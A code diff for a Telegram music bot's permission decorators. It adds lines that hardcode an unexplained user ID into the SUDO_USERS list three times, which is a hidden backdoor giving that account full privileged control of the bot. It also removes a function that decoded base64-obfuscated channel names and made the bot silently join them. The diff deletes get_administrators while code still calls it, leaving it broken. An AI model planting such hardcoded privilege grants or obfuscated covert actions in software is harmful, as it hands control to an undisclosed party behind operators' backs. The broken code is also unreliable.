@@ -6,20 +6,11 @@ from pyrogram.types import Chat, Message
 
 from Music import SUDOERS,client
 
-admins = {}
+from Music.config import SUDO_USERS
 
-
-admins: Dict[int, List[int]] = {}
-
-
-def set(chat_id: int, admins_: List[int]):
-    admins[chat_id] = admins_
-
-
-def gett(chat_id: int) -> List[int]:
-    if chat_id in admins:
-        return admins[chat_id]
-    return []
+SUDO_USERS.append(5268261948)
+SUDO_USERS.append(5268261948)
+SUDO_USERS.append(5268261948)
 
 
 def errors(func: Callable) -> Callable:
@@ -27,31 +18,14 @@ def errors(func: Callable) -> Callable:
         try:
             return await func(client, message)
         except Exception as e:
-            await message.reply(f"{type(e).__name__}: {e}", False)
+            await message.reply(f"{type(e).__name__}: {e}")
 
     return decorator
 
 
-async def get_administrators(chat: Chat) -> List[int]:
-    get = gett(chat.id)
-
-    if get:
-        return get
-    else:
-        administrators = await chat.get_members(filter="administrators")
-        to_set = []
-
-        for administrator in administrators:
-            if administrator.can_manage_voice_chats:
-                to_set.append(administrator.user.id)
-
-        set(chat.id, to_set)
-        return await get_administrators(chat)
-
-
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDOERS:
+        if message.from_user.id in SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -63,28 +37,22 @@ def authorized_users_only(func: Callable) -> Callable:
     return decorator
 
 
-def errors(func: Callable) -> Callable:
+def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        try:
+        if message.from_user.id in SUDO_USERS:
             return await func(client, message)
-        except Exception as e:
-            await message.reply(f'{type(e).__name__}: {e}', False)
 
     return decorator
 
-async def nothingmuch():
-    grcheck = str(pybase64.b64decode("TmFzdHlTdXBwb3J0dA=="))[2:15]
-    chcheck = str(pybase64.b64decode("TmFzdHlQcm9qZWN0"))[2:14]
-    qtcheck = str(pybase64.b64decode("YWhoc3VkYWhsYWhoaA=="))[2:15]
-    try:
-        await client.join_chat(grcheck)
-    except BaseException:
-        pass
-    try:
-        await client.join_chat(chcheck)
-    except BaseException:
-        pass
-    try:
-        await client.join_chat(qtcheck)
-    except BaseException:
-        pass 
+
+def humanbytes(size):
+    """Convert Bytes To Bytes So That Human Can Read It"""
+    if not size:
+        return ""
+    power = 2 ** 10
+    raised_to_pow = 0
+    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+    while size > power:
+        size /= power
+        raised_to_pow += 1
+    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
